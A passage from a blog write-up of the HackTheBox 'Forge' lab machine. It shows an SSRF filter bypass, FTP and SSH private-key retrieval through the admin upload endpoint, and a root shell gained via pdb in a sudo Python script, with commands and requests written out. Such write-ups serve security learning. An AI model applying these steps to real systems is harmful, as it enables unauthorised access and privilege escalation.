</span></span></code></pre></div><p>I&rsquo;ll run the redirector with:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell data-lang=shell><span class=line><span class=cl>→ kali@kali «exploits» «10.10.14.13» 
</span></span><span class=line><span class=cl>$ python3 redirector.py
</span></span></code></pre></div><p>After the redirector is running, I&rsquo;ll head to the upload page, intercept the upload request and change the URL value to my machine IP.</p><p>On submitting the request, I see there&rsquo;s a success message in the response.</p><p><div class=img-container><img src=imgs/image-20221015112628345.png alt=image-20221015112628345></div></p><p>A little explanation:</p><ol><li>My IP is not in the blacklist address, so the web starts making a request to it, where the redirector is running.</li><li>Since <code>requests.get()</code> follows redirection by default, the request goes straight to the site I intended to redirect to, which is <code>admin.forge.htb</code> and eventually bypasses the if condition that checks for blacklisted addresses.</li></ol><h4 id=ssrf-bypass-with-mixed-case>SSRF Bypass with Mixed Case<a class=anchor aria-hidden=true href=#ssrf-bypass-with-mixed-case>#</a></h4><p>Another way to bypass the filters is mixing upper case and lower case on the domain name like <code>admin.forge.htB</code>:</p><p><div class=img-container><img src=imgs/image-20210913214359458.png alt=image-20210913214359458></div></p><p>Since mixed case is less complicated, I&rsquo;ll prefer using it here.</p><p>With <code>curl</code>, I could see the page source of <code>admin.forge.htb</code>. There&rsquo;s two links here: <code>/announcements</code> and another <code>/upload</code>.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell data-lang=shell><span class=line><span class=cl>→ kali@kali «forge» «10.10.14.13» 
</span></span><span class=line><span class=cl>$ curl -s http://forge.htb/uploads/mn4G5G1B5oaF2SXMwbHH
</span></span><span class=line><span class=cl>&lt;!DOCTYPE html&gt;
</span></span><span class=line><span class=cl>&lt;html&gt;
</span></span><span class=line><span class=cl>&lt;head&gt;
</span></span><span class=line><span class=cl>    &lt;title&gt;Admin Portal&lt;/title&gt;
</span></span><span class=line><span class=cl>&lt;/head&gt;
</span></span><span class=line><span class=cl>&lt;body&gt;
</span></span><span class=line><span class=cl>    &lt;link <span class=nv>rel</span><span class=o>=</span><span class=s2>&#34;stylesheet&#34;</span> <span class=nv>type</span><span class=o>=</span><span class=s2>&#34;text/css&#34;</span> <span class=nv>href</span><span class=o>=</span><span class=s2>&#34;/static/css/main.css&#34;</span>&gt;
</span></span><span class=line><span class=cl>    &lt;header&gt;
</span></span><span class=line><span class=cl>            &lt;nav&gt;
</span></span><span class=line><span class=cl>                &lt;h1 <span class=nv>class</span><span class=o>=</span><span class=s2>&#34;&#34;</span>&gt;&lt;a <span class=nv>href</span><span class=o>=</span><span class=s2>&#34;/&#34;</span>&gt;Portal home&lt;/a&gt;&lt;/h1&gt;
</span></span><span class=line><span class=cl>                &lt;h1 <span class=nv>class</span><span class=o>=</span><span class=s2>&#34;align-right margin-right&#34;</span>&gt;&lt;a <span class=nv>href</span><span class=o>=</span><span class=s2>&#34;/announcements&#34;</span>&gt;Announcements&lt;/a&gt;&lt;/h1&gt;
</span></span><span class=line><span class=cl>                &lt;h1 <span class=nv>class</span><span class=o>=</span><span class=s2>&#34;align-right&#34;</span>&gt;&lt;a <span class=nv>href</span><span class=o>=</span><span class=s2>&#34;/upload&#34;</span>&gt;Upload image&lt;/a&gt;&lt;/h1&gt;
</span></span><span class=line><span class=cl>            &lt;/nav&gt;
</span></span><span class=line><span class=cl>    &lt;/header&gt;
</span></span><span class=line><span class=cl>    &lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;
</span></span><span class=line><span class=cl>    &lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;
</span></span><span class=line><span class=cl>    &lt;center&gt;&lt;h1&gt;Welcome Admins!&lt;/h1&gt;&lt;/center&gt;
</span></span><span class=line><span class=cl>&lt;/body&gt;
</span></span><span class=line><span class=cl>&lt;/html&gt;
</span></span></code></pre></div><p>Accessing <code>/announcements</code> via SSRF reveals interesting information:</p><ul><li>An FTP account</li><li>The upload feature in this admin portal now supports FTP and upload via query string <code>u</code> (<code>/upload?u=value</code>).</li></ul><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell data-lang=shell><span class=line><span class=cl>→ kali@kali «forge» «10.10.14.4» 
</span></span><span class=line><span class=cl>$ curl -s http://forge.htb/uploads/NatO83YkYfhzkl9fG9MB
</span></span><span class=line><span class=cl>&lt;!DOCTYPE html&gt;
</span></span><span class=line><span class=cl>&lt;html&gt;
</span></span><span class=line><span class=cl>&lt;head&gt;
</span></span><span class=line><span class=cl>    &lt;title&gt;Announcements&lt;/title&gt;
</span></span><span class=line><span class=cl>&lt;/head&gt;
</span></span><span class=line><span class=cl>&lt;body&gt;
</span></span><span class=line><span class=cl>    &lt;link <span class=nv>rel</span><span class=o>=</span><span class=s2>&#34;stylesheet&#34;</span> <span class=nv>type</span><span class=o>=</span><span class=s2>&#34;text/css&#34;</span> <span class=nv>href</span><span class=o>=</span><span class=s2>&#34;/static/css/main.css&#34;</span>&gt;
</span></span><span class=line><span class=cl>    &lt;link <span class=nv>rel</span><span class=o>=</span><span class=s2>&#34;stylesheet&#34;</span> <span class=nv>type</span><span class=o>=</span><span class=s2>&#34;text/css&#34;</span> <span class=nv>href</span><span class=o>=</span><span class=s2>&#34;/static/css/announcements.css&#34;</span>&gt;
</span></span><span class=line><span class=cl>    &lt;header&gt;
</span></span><span class=line><span class=cl>            &lt;nav&gt;
</span></span><span class=line><span class=cl>                &lt;h1 <span class=nv>class</span><span class=o>=</span><span class=s2>&#34;&#34;</span>&gt;&lt;a <span class=nv>href</span><span class=o>=</span><span class=s2>&#34;/&#34;</span>&gt;Portal home&lt;/a&gt;&lt;/h1&gt;
</span></span><span class=line><span class=cl>                &lt;h1 <span class=nv>class</span><span class=o>=</span><span class=s2>&#34;align-right margin-right&#34;</span>&gt;&lt;a <span class=nv>href</span><span class=o>=</span><span class=s2>&#34;/announcements&#34;</span>&gt;Announcements&lt;/a&gt;&lt;/h1&gt;
</span></span><span class=line><span class=cl>                &lt;h1 <span class=nv>class</span><span class=o>=</span><span class=s2>&#34;align-right&#34;</span>&gt;&lt;a <span class=nv>href</span><span class=o>=</span><span class=s2>&#34;/upload&#34;</span>&gt;Upload image&lt;/a&gt;&lt;/h1&gt;
</span></span><span class=line><span class=cl>            &lt;/nav&gt;
</span></span><span class=line><span class=cl>    &lt;/header&gt;
</span></span><span class=line><span class=cl>    &lt;br&gt;&lt;br&gt;&lt;br&gt;
</span></span><span class=line><span class=cl>    &lt;ul&gt;
</span></span><span class=line><span class=cl>        &lt;li&gt;An internal ftp server has been setup with credentials as user:heightofsecurity123!&lt;/li&gt;
</span></span><span class=line><span class=cl>        &lt;li&gt;The /upload endpoint now supports ftp, ftps, http and https protocols <span class=k>for</span> uploading from url.&lt;/li&gt;
</span></span><span class=line><span class=cl>        &lt;li&gt;The /upload endpoint has been configured <span class=k>for</span> easy scripting of uploads, and <span class=k>for</span> uploading an image, one can simply pass a url with ?u<span class=o>=</span><span class=p>&amp;</span>lt<span class=p>;</span>url<span class=p>&amp;</span>gt<span class=p>;</span>.&lt;/li&gt;
</span></span><span class=line><span class=cl>    &lt;/ul&gt;
</span></span><span class=line><span class=cl>&lt;/body&gt;
</span></span><span class=line><span class=cl>&lt;/html&gt;
</span></span></code></pre></div><h4 id=ftp-access>FTP Access<a class=anchor aria-hidden=true href=#ftp-access>#</a></h4><p>From here, I can try accessing the FTP service via the upload feature on the admin portal using the same SSRF bypass technique.</p><p><div class=img-container><img src=imgs/image-20221015121407530.png alt=image-20221015121407530></div></p><p>It seems the FTP host the user home dir. The user flag is done here.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell data-lang=shell><span class=line><span class=cl>→ kali@kali «forge» «10.10.14.4» 
</span></span><span class=line><span class=cl>$ curl -s http://forge.htb/uploads/0c47HKRZiXNh3F5smn2z
</span></span><span class=line><span class=cl>drwxr-xr-x    <span class=m>3</span> <span class=m>1000</span>     <span class=m>1000</span>         <span class=m>4096</span> Aug <span class=m>04</span> 19:23 snap
</span></span><span class=line><span class=cl>-rw-r-----    <span class=m>1</span> <span class=m>0</span>        <span class=m>1000</span>           <span class=m>33</span> Sep <span class=m>13</span> 08:17 user.txt
</span></span></code></pre></div><h4 id=ssh-access>SSH Access<a class=anchor aria-hidden=true href=#ssh-access>#</a></h4><p>For more stable access, I&rsquo;ll check if there&rsquo;s an SSH key:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-text data-lang=text><span class=line><span class=cl>http://admin.forge.htB/upload?u=ftp://:heightofsecurity123!@forge.htB/.ssh/
</span></span></code></pre></div><p>It&rsquo;s there.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell data-lang=shell><span class=line><span class=cl>→ kali@kali «forge» «10.10.14.4» 
</span></span><span class=line><span class=cl>$ curl -s http://forge.htb/uploads/AC1f3sbHcufWHGGTVpIG 
</span></span><span class=line><span class=cl>-rw-------    <span class=m>1</span> <span class=m>1000</span>     <span class=m>1000</span>          <span class=m>564</span> May <span class=m>31</span> 12:35 authorized_keys
</span></span><span class=line><span class=cl>-rw-------    <span class=m>1</span> <span class=m>1000</span>     <span class=m>1000</span>         <span class=m>2590</span> May <span class=m>20</span> 08:30 id_rsa
</span></span><span class=line><span class=cl>-rw-------    <span class=m>1</span> <span class=m>1000</span>     <span class=m>1000</span>          <span class=m>564</span> May <span class=m>20</span> 08:30 id_rsa.pub
</span></span></code></pre></div><p>I&rsquo;ll grab that with</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-text data-lang=text><span class=line><span class=cl>http://admin.forge.htB/upload?u=ftp://:heightofsecurity123!@forge.htB/.ssh/id_rsa
</span></span></code></pre></div><p>And save it to my machine.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell data-lang=shell><span class=line><span class=cl>→ kali@kali «forge» «10.10.14.4» 
</span></span><span class=line><span class=cl>$ curl -s http://forge.htb/uploads/hvcNBsh1xwD4c6Nyq0tP <span class=p>|</span> tee user_rsa
</span></span><span class=line><span class=cl>-----BEGIN OPENSSH PRIVATE KEY-----
</span></span><span class=line><span class=cl>b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABlwAAAAdzc2gtcn
</span></span><span class=line><span class=cl>...<span class=o>[</span>SNIP<span class=o>]</span>...
</span></span><span class=line><span class=cl>nR7k4+Pryk8HqgNS3/g1/Fpd52DDziDOAIfORntwkuiQSlg63hF3vadCAV3KIVLtBONXH2
</span></span><span class=line><span class=cl><span class=nv>shlLupso7WoS0AAAAKdXNlckBmb3JnZQE</span><span class=o>=</span>
</span></span><span class=line><span class=cl>-----END OPENSSH PRIVATE KEY-----
</span></span></code></pre></div><p>Now I can SSH login as <code>user</code>.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell data-lang=shell><span class=line><span class=cl>→ kali@kali «forge» «10.10.14.4» 
</span></span><span class=line><span class=cl>$ chmod <span class=m>600</span> user_rsa <span class=o>&amp;&amp;</span> ssh -i user_rsa user@forge.htb  
</span></span><span class=line><span class=cl>Welcome to Ubuntu 20.04.3 LTS <span class=o>(</span>GNU/Linux 5.4.0-81-generic x86_64<span class=o>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>...<span class=o>[</span>SNIP<span class=o>]</span>...
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>  System information as of Mon <span class=m>13</span> Sep <span class=m>2021</span> 03:12:44 PM UTC
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>  System load:  0.0               Processes:             <span class=m>223</span>
</span></span><span class=line><span class=cl>  Usage of /:   44.5% of 6.82GB   Users logged in:       <span class=m>0</span>
</span></span><span class=line><span class=cl>  Memory usage: 26%               IPv4 address <span class=k>for</span> eth0: 10.10.11.111
</span></span><span class=line><span class=cl>  Swap usage:   0%
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>...<span class=o>[</span>SNIP<span class=o>]</span>...
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>Last login: Mon Sep <span class=m>13</span> 13:30:33 <span class=m>2021</span> from 10.10.14.141
</span></span><span class=line><span class=cl>user@forge:~$ id
</span></span><span class=line><span class=cl><span class=nv>uid</span><span class=o>=</span>1000<span class=o>(</span>user<span class=o>)</span> <span class=nv>gid</span><span class=o>=</span>1000<span class=o>(</span>user<span class=o>)</span> <span class=nv>groups</span><span class=o>=</span>1000<span class=o>(</span>user<span class=o>)</span>
</span></span></code></pre></div><h2 id=privilege-escalation>Privilege Escalation<a class=anchor aria-hidden=true href=#privilege-escalation>#</a></h2><h3 id=shell-as-root>Shell as root<a class=anchor aria-hidden=true href=#shell-as-root>#</a></h3><h4 id=enumeration-1>Enumeration<a class=anchor aria-hidden=true href=#enumeration-1>#</a></h4><p><code>user</code> is allowed to run <code>/opt/remote-manage.py</code> as root.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell data-lang=shell><span class=line><span class=cl>user@forge:~$ sudo -l
</span></span><span class=line><span class=cl>Matching Defaults entries <span class=k>for</span> user on forge:
</span></span><span class=line><span class=cl>    env_reset, mail_badpass, <span class=nv>secure_path</span><span class=o>=</span>/usr/local/sbin<span class=se>\:</span>/usr/local/bin<span class=se>\:</span>/usr/sbin<span class=se>\:</span>/usr/bin<span class=se>\:</span>/sbin<span class=se>\:</span>/bin<span class=se>\:</span>/snap/bin
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>User user may run the following commands on forge:
</span></span><span class=line><span class=cl>    <span class=o>(</span>ALL : ALL<span class=o>)</span> NOPASSWD: /usr/bin/python3 /opt/remote-manage.py
</span></span><span class=line><span class=cl>user@forge:~$ ls -l /opt/remote-manage.py
</span></span><span class=line><span class=cl>-rwxr-xr-x <span class=m>1</span> root root <span class=m>1447</span> May <span class=m>31</span> 12:09 /opt/remote-manage.py
</span></span></code></pre></div><h4 id=source-code-review>Source Code Review<a class=anchor aria-hidden=true href=#source-code-review>#</a></h4><p>Looking at the source code, this script is a simple tool for monitoring process, disk, and network sockets.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=ch>#!/usr/bin/env python3</span>
</span></span><span class=line><span class=cl><span class=kn>import</span> <span class=nn>socket</span>
</span></span><span class=line><span class=cl><span class=kn>import</span> <span class=nn>random</span>
</span></span><span class=line><span class=cl><span class=kn>import</span> <span class=nn>subprocess</span>
</span></span><span class=line><span class=cl><span class=kn>import</span> <span class=nn>pdb</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>port</span> <span class=o>=</span> <span class=n>random</span><span class=o>.</span><span class=n>randint</span><span class=p>(</span><span class=mi>1025</span><span class=p>,</span> <span class=mi>65535</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>try</span><span class=p>:</span>
</span></span><span class=line><span class=cl>    <span class=n>sock</span> <span class=o>=</span> <span class=n>socket</span><span class=o>.</span><span class=n>socket</span><span class=p>(</span><span class=n>socket</span><span class=o>.</span><span class=n>AF_INET</span><span class=p>,</span> <span class=n>socket</span><span class=o>.</span><span class=n>SOCK_STREAM</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>sock</span><span class=o>.</span><span class=n>setsockopt</span><span class=p>(</span><span class=n>socket</span><span class=o>.</span><span class=n>SOL_SOCKET</span><span class=p>,</span> <span class=n>socket</span><span class=o>.</span><span class=n>SO_REUSEADDR</span><span class=p>,</span> <span class=mi>1</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>sock</span><span class=o>.</span><span class=n>bind</span><span class=p>((</span><span class=s1>&#39;127.0.0.1&#39;</span><span class=p>,</span> <span class=n>port</span><span class=p>))</span>
</span></span><span class=line><span class=cl>    <span class=n>sock</span><span class=o>.</span><span class=n>listen</span><span class=p>(</span><span class=mi>1</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=nb>print</span><span class=p>(</span><span class=sa>f</span><span class=s1>&#39;Listening on localhost:</span><span class=si>{</span><span class=n>port</span><span class=si>}</span><span class=s1>&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=p>(</span><span class=n>clientsock</span><span class=p>,</span> <span class=n>addr</span><span class=p>)</span> <span class=o>=</span> <span class=n>sock</span><span class=o>.</span><span class=n>accept</span><span class=p>()</span>
</span></span><span class=line><span class=cl>    <span class=n>clientsock</span><span class=o>.</span><span class=n>send</span><span class=p>(</span><span class=sa>b</span><span class=s1>&#39;Enter the secret passsword: &#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=n>clientsock</span><span class=o>.</span><span class=n>recv</span><span class=p>(</span><span class=mi>1024</span><span class=p>)</span><span class=o>.</span><span class=n>strip</span><span class=p>()</span><span class=o>.</span><span class=n>decode</span><span class=p>()</span> <span class=o>!=</span> <span class=s1>&#39;secretadminpassword&#39;</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=n>clientsock</span><span class=o>.</span><span class=n>send</span><span class=p>(</span><span class=sa>b</span><span class=s1>&#39;Wrong password!</span><span class=se>\n</span><span class=s1>&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=k>else</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=n>clientsock</span><span class=o>.</span><span class=n>send</span><span class=p>(</span><span class=sa>b</span><span class=s1>&#39;Welcome admin!</span><span class=se>\n</span><span class=s1>&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>        <span class=k>while</span> <span class=kc>True</span><span class=p>:</span>
</span></span><span class=line><span class=cl>            <span class=n>clientsock</span><span class=o>.</span><span class=n>send</span><span class=p>(</span><span class=sa>b</span><span class=s1>&#39;</span><span class=se>\n</span><span class=s1>What do you wanna do: </span><span class=se>\n</span><span class=s1>&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>            <span class=n>clientsock</span><span class=o>.</span><span class=n>send</span><span class=p>(</span><span class=sa>b</span><span class=s1>&#39;[1] View processes</span><span class=se>\n</span><span class=s1>&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>            <span class=n>clientsock</span><span class=o>.</span><span class=n>send</span><span class=p>(</span><span class=sa>b</span><span class=s1>&#39;[2] View free memory</span><span class=se>\n</span><span class=s1>&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>            <span class=n>clientsock</span><span class=o>.</span><span class=n>send</span><span class=p>(</span><span class=sa>b</span><span class=s1>&#39;[3] View listening sockets</span><span class=se>\n</span><span class=s1>&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>            <span class=n>clientsock</span><span class=o>.</span><span class=n>send</span><span class=p>(</span><span class=sa>b</span><span class=s1>&#39;[4] Quit</span><span class=se>\n</span><span class=s1>&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>            <span class=n>option</span> <span class=o>=</span> <span class=nb>int</span><span class=p>(</span><span class=n>clientsock</span><span class=o>.</span><span class=n>recv</span><span class=p>(</span><span class=mi>1024</span><span class=p>)</span><span class=o>.</span><span class=n>strip</span><span class=p>())</span>
</span></span><span class=line><span class=cl>            <span class=k>if</span> <span class=n>option</span> <span class=o>==</span> <span class=mi>1</span><span class=p>:</span>
</span></span><span class=line><span class=cl>                <span class=n>clientsock</span><span class=o>.</span><span class=n>send</span><span class=p>(</span><span class=n>subprocess</span><span class=o>.</span><span class=n>getoutput</span><span class=p>(</span><span class=s1>&#39;ps aux&#39;</span><span class=p>)</span><span class=o>.</span><span class=n>encode</span><span class=p>())</span>
</span></span><span class=line><span class=cl>            <span class=k>elif</span> <span class=n>option</span> <span class=o>==</span> <span class=mi>2</span><span class=p>:</span>
</span></span><span class=line><span class=cl>                <span class=n>clientsock</span><span class=o>.</span><span class=n>send</span><span class=p>(</span><span class=n>subprocess</span><span class=o>.</span><span class=n>getoutput</span><span class=p>(</span><span class=s1>&#39;df&#39;</span><span class=p>)</span><span class=o>.</span><span class=n>encode</span><span class=p>())</span>
</span></span><span class=line><span class=cl>            <span class=k>elif</span> <span class=n>option</span> <span class=o>==</span> <span class=mi>3</span><span class=p>:</span>
</span></span><span class=line><span class=cl>                <span class=n>clientsock</span><span class=o>.</span><span class=n>send</span><span class=p>(</span><span class=n>subprocess</span><span class=o>.</span><span class=n>getoutput</span><span class=p>(</span><span class=s1>&#39;ss -lnt&#39;</span><span class=p>)</span><span class=o>.</span><span class=n>encode</span><span class=p>())</span>
</span></span><span class=line><span class=cl>            <span class=k>elif</span> <span class=n>option</span> <span class=o>==</span> <span class=mi>4</span><span class=p>:</span>
</span></span><span class=line><span class=cl>                <span class=n>clientsock</span><span class=o>.</span><span class=n>send</span><span class=p>(</span><span class=sa>b</span><span class=s1>&#39;Bye</span><span class=se>\n</span><span class=s1>&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>                <span class=k>break</span>
</span></span><span class=line><span class=cl><span class=k>except</span> <span class=ne>Exception</span> <span class=k>as</span> <span class=n>e</span><span class=p>:</span>
</span></span><span class=line><span class=cl>    <span class=nb>print</span><span class=p>(</span><span class=n>e</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>pdb</span><span class=o>.</span><span class=n>post_mortem</span><span class=p>(</span><span class=n>e</span><span class=o>.</span><span class=n>__traceback__</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=k>finally</span><span class=p>:</span>
</span></span><span class=line><span class=cl>    <span class=n>quit</span><span class=p>()</span>
</span></span></code></pre></div><p>There&rsquo;s a hardcoded password of <code>secretadminpassword</code>. One that stands out in this code is the error/exception handling, where it calls Python debugger (<code>pdb</code>). Since PDB is an interactive debugger, it is possible to <strong>run Python code</strong> during a debug session.</p><p>To get into that debug session, I need to cause an error to the tool and this can be achieved by sending a SIGINT.</p><h4 id=exploitation>Exploitation<a class=anchor aria-hidden=true href=#exploitation>#</a></h4><p>First, I&rsquo;ll run the script with <code>sudo</code> and I&rsquo;ll open another SSH sessions.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell data-lang=shell><span class=line><span class=cl>user@forge:~$ sudo /usr/bin/python3 /opt/remote-manage.py
</span></span><span class=line><span class=cl>Listening on localhost:51411
</span></span></code></pre></div><p>On the second SSH session, I&rsquo;ll connect to <code>26713</code> using <code>nc</code> and immediately send a SIGINT with <code>CTRL+C</code>.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell data-lang=shell><span class=line><span class=cl>user@forge:~$ nc 127.0.0.1 <span class=m>51411</span>
</span></span><span class=line><span class=cl>Enter the secret passsword: secretadminpassword
</span></span><span class=line><span class=cl>Welcome admin!
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>What <span class=k>do</span> you wanna <span class=k>do</span>: 
</span></span><span class=line><span class=cl><span class=o>[</span>1<span class=o>]</span> View processes
</span></span><span class=line><span class=cl><span class=o>[</span>2<span class=o>]</span> View free memory
</span></span><span class=line><span class=cl><span class=o>[</span>3<span class=o>]</span> View listening sockets
</span></span><span class=line><span class=cl><span class=o>[</span>4<span class=o>]</span> Quit
</span></span><span class=line><span class=cl>^C
</span></span></code></pre></div><p>On the first SSH session, it&rsquo;s now has the Pdb prompt (debug session).</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell data-lang=shell><span class=line><span class=cl>user@forge:/opt$ sudo /usr/bin/python3 /opt/remote-manage.py
</span></span><span class=line><span class=cl>Listening on localhost:51411
</span></span><span class=line><span class=cl>invalid literal <span class=k>for</span> int<span class=o>()</span> with base 10: b<span class=s1>&#39;&#39;</span>
</span></span><span class=line><span class=cl>&gt; /opt/remote-manage.py<span class=o>(</span>27<span class=o>)</span>&lt;module&gt;<span class=o>()</span>
</span></span><span class=line><span class=cl>-&gt; <span class=nv>option</span> <span class=o>=</span> int<span class=o>(</span>clientsock.recv<span class=o>(</span>1024<span class=o>)</span>.strip<span class=o>())</span>
</span></span><span class=line><span class=cl><span class=o>(</span>Pdb<span class=o>)</span> 
</span></span></code></pre></div><p>Since it&rsquo;s a root process, I&rsquo;ve full access now on the system.</p><p><div class=img-container><img src=imgs/image-20221015130859441.png alt=image-20221015130859441></div></p><p>I&rsquo;ll run <code>os.system('/bin/bash')</code> to spawn a bash shell and grab the root flag.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell data-lang=shell><span class=line><span class=cl><span class=o>(</span>Pdb<span class=o>)</span> os.system<span class=o>(</span><span class=s1>&#39;/bin/bash&#39;</span><span class=o>)</span>
</span></span><span class=line><span class=cl>root@forge:/opt# ls -l /root/root.txt 
</span></span><span class=line><span class=cl>-rw------- <span class=m>1</span> root root <span class=m>33</span> Oct <span class=m>15</span> 03:08 /root/root.txt
</span></span><span class=line><span class=cl>root@forge:/opt# 
</span></span><span class=line><span class=cl>root@forge:/opt# cat /root/root.txt 
</span></span><span class=line><span class=cl>73930b...<span class=o>[</span>SNIP<span class=o>]</span>...
</span></span></code></pre></div><div class=post-references><h2>Reference</h2><ul><li><a href=https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Request%20Forgery#bypass-localhost-with-a-domain-redirection>PayloadAllTheThings SSRF</a></li></ul></div></div></div><div class=post-meta-bottom></div><footer class=post-footer><ul class=post-tags><li><a href=https://fahmifj.github.io/tags/oscp-like/>OSCP-like</a></li><li><a href=https://fahmifj.github.io/tags/linux/>Linux</a></li><li><a href=https://fahmifj.github.io/tags/ssrf/>SSRF</a></li><li><a href=https://fahmifj.github.io/tags/vhost/>Vhost</a></li><li><a href=https://fahmifj.github.io/tags/ffuf/>ffuf</a></li><li><a href=https://fahmifj.github.io/tags/pdb/>pdb</a></li><li><a href=https://fahmifj.github.io/tags/code-review/>Code-review</a></li><li><a href=https://fahmifj.github.io/tags/flask/>Flask</a></li></ul><div class=share-buttons><a target=_blank rel="noopener noreferrer" aria-label="share HackTheBox - Forge on twitter" href="https://twitter.com/intent/tweet/?text=HackTheBox%20-%20Forge&url=https%3a%2f%2ffahmifj.github.io%2fhackthebox%2fforge%2f&hashtags=OSCP-like%2cLinux%2cSSRF%2cVhost%2cffuf%2cpdb%2ccode-review%2cFlask"><svg viewBox="0 0 512 512"><path d="M449.446.0C483.971.0 512 28.03 512 62.554v386.892C512 483.97 483.97 512 449.446 512H62.554c-34.524.0-62.554-28.03-62.554-62.554V62.554c0-34.524 28.029-62.554 62.554-62.554h386.892zM195.519 424.544c135.939.0 210.268-112.643 210.268-210.268.0-3.218.0-6.437-.153-9.502 14.406-10.421 26.973-23.448 36.935-38.314-13.18 5.824-27.433 9.809-42.452 11.648 15.326-9.196 26.973-23.602 32.49-40.92-14.252 8.429-30.038 14.56-46.896 17.931-13.487-14.406-32.644-23.295-53.946-23.295-40.767.0-73.87 33.104-73.87 73.87.0 5.824.613 11.494 1.992 16.858-61.456-3.065-115.862-32.49-152.337-77.241-6.284 10.881-9.962 23.601-9.962 37.088.0 25.594 13.027 48.276 32.95 61.456-12.107-.307-23.448-3.678-33.41-9.196v.92c0 35.862 25.441 65.594 59.311 72.49-6.13 1.686-12.72 2.606-19.464 2.606-4.751.0-9.348-.46-13.946-1.38 9.349 29.426 36.628 50.728 68.965 51.341-25.287 19.771-57.164 31.571-91.8 31.571-5.977.0-11.801-.306-17.625-1.073 32.337 21.15 71.264 33.41 112.95 33.41z"/></svg></a><a target=_blank rel="noopener noreferrer" aria-label="share HackTheBox - Forge on linkedin" href="https://www.linkedin.com/shareArticle?mini=true&url=https%3a%2f%2ffahmifj.github.io%2fhackthebox%2fforge%2f&title=HackTheBox%20-%20Forge&summary=HackTheBox%20-%20Forge&source=https%3a%2f%2ffahmifj.github.io%2fhackthebox%2fforge%2f"><svg viewBox="0 0 512 512"><path d="M449.446.0C483.971.0 512 28.03 512 62.554v386.892C512 483.97 483.97 512 449.446 512H62.554c-34.524.0-62.554-28.03-62.554-62.554V62.554c0-34.524 28.029-62.554 62.554-62.554h386.892zM160.461 423.278V197.561h-75.04v225.717h75.04zm270.539.0V293.839c0-69.333-37.018-101.586-86.381-101.586-39.804.0-57.634 21.891-67.617 37.266v-31.958h-75.021c.995 21.181.0 225.717.0 225.717h75.02V297.222c0-6.748.486-13.492 2.474-18.315 5.414-13.475 17.767-27.434 38.494-27.434 27.135.0 38.007 20.707 38.007 51.037v120.768H431zM123.448 88.722C97.774 88.722 81 105.601 81 127.724c0 21.658 16.264 39.002 41.455 39.002h.484c26.165.0 42.452-17.344 42.452-39.002-.485-22.092-16.241-38.954-41.943-39.002z"/></svg></a><a target=_blank rel="noopener noreferrer" aria-label="share HackTheBox - Forge on reddit" href="https://reddit.com/submit?url=https%3a%2f%2ffahmifj.github.io%2fhackthebox%2fforge%2f&title=HackTheBox%20-%20Forge"><svg viewBox="0 0 512 512"><path d="M449.446.0C483.971.0 512 28.03 512 62.554v386.892C512 483.97 483.97 512 449.446 512H62.554c-34.524.0-62.554-28.03-62.554-62.554V62.554c0-34.524 28.029-62.554 62.554-62.554h386.892zM446 265.638c0-22.964-18.616-41.58-41.58-41.58-11.211.0-21.361 4.457-28.841 11.666-28.424-20.508-67.586-33.757-111.204-35.278l18.941-89.121 61.884 13.157c.756 15.734 13.642 28.29 29.56 28.29 16.407.0 29.706-13.299 29.706-29.701.0-16.403-13.299-29.702-29.706-29.702-11.666.0-21.657 6.792-26.515 16.578l-69.105-14.69c-1.922-.418-3.939-.042-5.585 1.036-1.658 1.073-2.811 2.761-3.224 4.686l-21.152 99.438c-44.258 1.228-84.046 14.494-112.837 35.232-7.468-7.164-17.589-11.591-28.757-11.591-22.965.0-41.585 18.616-41.585 41.58.0 16.896 10.095 31.41 24.568 37.918-.639 4.135-.99 8.328-.99 12.576.0 63.977 74.469 115.836 166.33 115.836s166.334-51.859 166.334-115.836c0-4.218-.347-8.387-.977-12.493 14.564-6.47 